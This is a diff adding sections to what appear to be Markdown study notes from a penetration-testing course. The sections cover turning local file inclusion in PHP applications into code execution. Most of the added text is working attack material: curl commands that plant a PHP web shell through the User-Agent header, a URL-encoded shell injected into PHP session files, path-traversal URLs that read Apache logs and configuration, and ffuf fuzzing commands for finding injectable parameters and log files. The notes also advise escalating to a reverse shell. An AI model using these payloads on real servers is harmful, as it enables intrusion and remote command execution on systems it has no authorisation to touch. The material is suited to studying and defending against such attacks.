@@ -396,3 +396,149 @@ The **phar wrapper** can execute PHP code from a phar file.
    ```
 
 ---
+
+
+# Log Poisoning Techniques
+
+## 1. **Log Poisoning**
+- **Concept**: Inject PHP code into log files that the application logs HTTP headers into, such as User-Agent. The PHP code will execute when the log file is included through a Local File Inclusion (LFI) vulnerability.
+- **Requirements**:
+  - The PHP application must allow LFI.
+  - Must have read access to log files.
+- **Command Example (via cURL)**:
+  ```bash
+  curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
+  ```
+- **Execution Command (to execute poisoned log file)**:
+  ```url
+  http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
+  ```
+
+
+## 2. **PHP Session Poisoning**
+- **Objective**: Exploit PHP session files (`PHPSESSID`) to execute malicious PHP code stored in the session file.
+- **Steps**:
+  1. Retrieve your `PHPSESSID` cookie value.
+     - Example value: `nhhv8i0o6ua4g88bkdl9u1fdsd`.
+  2. Access the session file using LFI. Example:
+     ```url
+     http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
+     ```
+  3. Inject a PHP web shell into the session file using a URL-encoded payload:
+     ```url
+     http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+     ```
+  4. Re-include the session file with a `cmd` parameter for execution:
+     ```url
+     http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+     ```
+- **Note**: Each session file inclusion overwrites the file. Use the poisoned web shell to write a permanent shell or send a reverse shell for easier interaction.
+
+
+
+## 3. **Server Log Poisoning**
+- **Applicable Logs**:
+  - Apache (`/var/log/apache2/`)
+  - Nginx (`/var/log/nginx/`)
+  - Other logs, e.g., `/var/log/sshd.log`, `/var/log/mail`, `/var/log/vsftpd.log`.
+- **Steps**:
+  1. Modify `User-Agent` with a PHP web shell using Burp Suite or cURL.
+     - Example using Burp Suite: 
+       Modify `User-Agent` header in the HTTP request to:
+       ```php
+       <?php system($_GET['cmd']); ?>
+       ```
+     - Example using cURL:
+       ```bash
+       curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
+       ```
+  2. Include the log file with LFI to execute the code:
+     ```url
+     http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
+     ```
+  3. Use the `&cmd=` parameter to pass commands (e.g., `&cmd=id`).
+
+
+## 4. **/proc File Poisoning**
+- **Files to Target**:
+  - `/proc/self/environ`: Contains environment variables.
+  - `/proc/self/fd/N`: File descriptors for process `N`.
+- **Concept**: Poison readable `/proc` files with PHP code if access to logs is restricted. Include them using LFI for code execution.
+
+
+## General Notes:
+- **Other Services to Target**:
+  - SSH Logs: Inject PHP code as a username during login attempts.
+  - FTP Logs: Use PHP code as a username in FTP sessions.
+  - Mail Logs: Send an email containing PHP code.
+- **Tip**: Ensure read access to logs or `/proc` files before attempting these methods. Use fuzzing tools to locate files if needed.
+- **Fuzz Example**: Use an LFI Wordlist to find log file locations.
+
+
+---
+
+# Automated Scanning for LFI Vulnerabilities
+
+## **Why Manual Exploitation Matters**
+- It is crucial to understand and craft custom payloads for exploiting file inclusion vulnerabilities.
+- Custom payloads can bypass WAFs/firewalls or adapt to specific configurations.
+- Automated tools can save time in trivial cases but may not catch advanced scenarios.
+
+## **Fuzzing Parameters**
+- **Why?** 
+  Exposed parameters (e.g., GET/POST) may not be tied to HTML forms and are often less secure.
+
+- **Example Command for Fuzzing GET Parameters**:
+  ```bash
+  ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+  ```
+
+- **Tips**: Use specific wordlists tailored for LFI vulnerabilities.
+
+## **LFI Wordlists**
+- **Why?**
+  To test for common LFI payloads quickly using predefined wordlists.
+
+- **Popular Wordlist**: `LFI-Jhaddix.txt`.
+- **Example Command**:
+  ```bash
+  ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+  ```
+- **Next Steps**: Test identified payloads manually to confirm they show the included file’s content.
+
+
+## **Fuzzing Server Files**
+### Server Webroot Path
+- **Why?**
+  To locate important files like uploads or understand server structure.
+
+- **Example Command**:
+  ```bash
+  ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+  ```
+
+
+### Server Logs/Configuration Files
+- **Why?**
+  To locate log files for log poisoning or find webroot paths in configuration files.
+
+- **Example Command**:
+  ```bash
+  ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+  ```
+
+- **Manual Testing Command** (Example for reading a configuration file):
+  ```bash
+  curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
+  ```
+
+## **Common Tools for LFI**
+- **Popular Tools**:
+  - LFISuite
+  - LFiFreak
+  - liffy
+- **Limitations**:
+  - Many tools are outdated and rely on Python 2.
+  - Manual methods often yield better results in complex scenarios.
+
+---
